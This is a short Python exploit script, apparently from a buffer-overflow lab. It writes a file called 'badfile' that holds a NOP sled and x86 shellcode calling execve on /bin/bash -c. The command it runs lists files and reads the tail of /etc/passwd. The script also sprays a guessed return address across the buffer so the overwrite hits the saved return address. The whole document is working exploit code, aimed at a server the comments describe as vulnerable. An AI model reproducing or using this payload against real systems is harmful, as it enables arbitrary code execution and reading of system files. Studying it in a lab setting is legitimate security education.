#!/usr/bin/python3
import sys

shellcode= (
  "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
  "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
  "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd          *"
  "AAAA" # Placeholder for argv[0] --> "/bin/bash"
  "BBBB" # Placeholder for argv[1] --> "-c"
  "CCCC" # Placeholder for argv[2] --> the command string
  "DDDD" # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# the shellcode goes at the end
content[517 - len(shellcode):] = shellcode

ret    = 0xffffd6c8 + 300     # 0xffffd6c8 is the buffer address printed by the server and it changes at each execution. 300 is the maximum size of the buffer. 

# We literaly fill the whole buffer with the new return address assuming that at some point we will find the correct field to save the return address into
for offset in range(50):
  content[offset*4:offset*4 + 4] = (ret).to_bytes(4,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
